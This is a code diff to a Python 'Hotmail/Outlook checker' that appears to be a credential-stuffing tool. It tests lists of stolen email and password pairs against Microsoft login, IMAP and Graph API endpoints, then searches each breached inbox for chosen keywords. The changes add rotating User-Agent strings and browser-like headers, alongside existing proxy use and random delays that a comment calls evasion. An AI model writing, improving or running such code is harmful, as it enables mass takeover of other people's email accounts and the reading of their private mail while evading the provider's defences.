@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Hotmail/Outlook Checker Core Logic
-Refactored for High Performance & Stability.
+Refactored for Elite Performance & Stability.
 """
 
 import asyncio
@@ -83,12 +83,34 @@ class MicrosoftAuth:
         }
     }
 
+    USER_AGENTS = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36'
+    ]
+
     def __init__(self, config: Config, session: aiohttp.ClientSession):
         self.config = config
         self.session = session
         # Fast DNS Resolver
         self.resolver = dns.resolver.Resolver(configure=False)
         self.resolver.nameservers = ['1.1.1.1', '1.0.0.1']
+
+    def _get_headers(self):
+        return {
+            'User-Agent': random.choice(self.USER_AGENTS),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1'
+        }
 
     async def legacy_authenticate(self, email: str, password: str, executor: ThreadPoolExecutor, proxy: str = None):
         """Legacy authentication method (IMAP/POP3/SMTP) - Non-blocking via Executor"""
@@ -126,12 +148,8 @@ class MicrosoftAuth:
             'keywords_found': []
         }
 
-        # Use Fast DNS resolution for server IP if possible (optional opt)
-        # Standard lib connects by hostname usually.
-
         for server, port in self.SERVERS['imap'].items():
             try:
-                # Optimized timeout
                 if self.config.imap_ssl:
                     imap = imaplib.IMAP4_SSL(server, port, timeout=self.config.timeout)
                 else:
@@ -141,9 +159,8 @@ class MicrosoftAuth:
                 result['success'] = True
                 result['server'] = f"{server}:{port}"
 
-                # Check inbox only if needed
                 if self.config.check_inbox:
-                    imap.select('INBOX', readonly=True) # Readonly is faster
+                    imap.select('INBOX', readonly=True)
 
                     typ, data = imap.search(None, 'ALL')
                     if typ == 'OK' and data[0]:
@@ -153,12 +170,10 @@ class MicrosoftAuth:
                         found_keywords = []
                         for keyword in self.config.search_keywords:
                             try:
-                                # Quick subject scan first
                                 typ, data = imap.search(None, f'(SUBJECT "{keyword}")')
                                 if typ == 'OK' and data[0]:
                                     found_keywords.append(keyword)
                                     continue
-                                # Deep body scan only if subject failed
                                 typ, data = imap.search(None, f'(BODY "{keyword}")')
                                 if typ == 'OK' and data[0]:
                                     found_keywords.append(keyword)
@@ -173,7 +188,7 @@ class MicrosoftAuth:
                 error_str = str(e)
                 result['error'] = error_str
                 if 'AUTHENTICATIONFAILED' in error_str.upper():
-                    break # Don't try other servers if creds are wrong
+                    break
                 continue
 
         return result
@@ -227,16 +242,15 @@ class MicrosoftAuth:
 
             auth_url = f"{self.ENDPOINTS['authorize']}?{urllib.parse.urlencode(auth_params)}"
             req_kwargs = {'proxy': proxy} if proxy else {}
+            headers = self._get_headers()
 
-            # First GET
-            async with self.session.get(auth_url, **req_kwargs) as response:
+            async with self.session.get(auth_url, headers=headers, **req_kwargs) as response:
                 html = await response.text()
                 sft_match = re.search(r'name="sFT" value="([^"]+)"', html)
                 if not sft_match:
                     return {'success': False, 'error': 'No sFT token found'}
                 sft = sft_match.group(1)
 
-            # Login POST
             login_data = {
                 'login': email,
                 'passwd': password,
@@ -253,10 +267,7 @@ class MicrosoftAuth:
                 'i18': '__Login_Host|1'
             }
 
-            headers = {
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            }
+            headers['Content-Type'] = 'application/x-www-form-urlencoded'
 
             async with self.session.post(
                 'https://login.live.com/ppsecure/post.srf',
@@ -270,7 +281,6 @@ class MicrosoftAuth:
                     code_match = re.search(r'code=([^&]+)', redirect_url)
 
                     if code_match:
-                        # Token Exchange
                         token_data = {
                             'client_id': '00000002-0000-0ff1-ce00-000000000000',
                             'code': code_match.group(1),
@@ -300,20 +310,15 @@ class MicrosoftAuth:
         try:
             headers = {
                 'Authorization': f'Bearer {access_token}',
-                'User-Agent': 'Mozilla/5.0'
+                'User-Agent': random.choice(self.USER_AGENTS)
             }
             req_kwargs = {'proxy': proxy} if proxy else {}
-
-            # Use gather to fetch profile and inbox in parallel if possible
-            # But we need profile ID for some ops, usually just /me is fine.
-            # Let's do /me first to confirm validity
 
             async with self.session.get(self.ENDPOINTS['graph_me'], headers=headers, **req_kwargs) as response:
                 if response.status != 200:
                     return {'success': False, 'error': f'Graph API error: {response.status}'}
                 profile = await response.json()
 
-            # Now fetch inbox and search keywords
             inbox_task = self.session.get(
                 self.ENDPOINTS['graph_inbox'],
                 headers=headers,
@@ -340,7 +345,6 @@ class MicrosoftAuth:
                         )
                     )
 
-            # Execute all
             responses = await asyncio.gather(inbox_task, *kw_tasks, return_exceptions=True)
 
             inbox_resp = responses[0]
@@ -349,7 +353,6 @@ class MicrosoftAuth:
                 inbox_data = await inbox_resp.json()
                 inbox_count = len(inbox_data.get('value', []))
 
-            # Process Keywords
             for i, resp in enumerate(responses[1:]):
                 if isinstance(resp, aiohttp.ClientResponse) and resp.status == 200:
                     data = await resp.json()
@@ -517,14 +520,12 @@ class HotmailCheckerV77:
 
         # Connection Pooling Optimized
         connector = aiohttp.TCPConnector(
-            limit=None, # We limit concurrency via semaphore
+            limit=None,
             limit_per_host=100,
             ssl=False,
             ttl_dns_cache=300
         )
 
-        # Executor for legacy blocking calls
-        # Size matches threads config to prevent bottleneck
         executor = ThreadPoolExecutor(max_workers=self.config.threads)
 
         async with aiohttp.ClientSession(connector=connector) as session:
@@ -535,7 +536,6 @@ class HotmailCheckerV77:
                 if not self.stats['is_running']: return
 
                 async with semaphore:
-                    # Random delay optional but good for evasion
                     if self.config.random_delay:
                         await asyncio.sleep(random.uniform(0.1, 0.5))
 
@@ -543,10 +543,6 @@ class HotmailCheckerV77:
                     result = await self.auth.check_account(email, password, executor, proxy=proxy)
                     self._categorize_result(result)
                     self.stats['checked'] += 1
-
-                    # Update callback is called by the main loop/bot logic based on timer
-                    # calling it here every time is what caused the lag/timeout.
-                    # We will NOT call it here. The bot task monitors self.stats
 
             tasks = [asyncio.create_task(worker(e, p)) for e, p in self.combos]
 
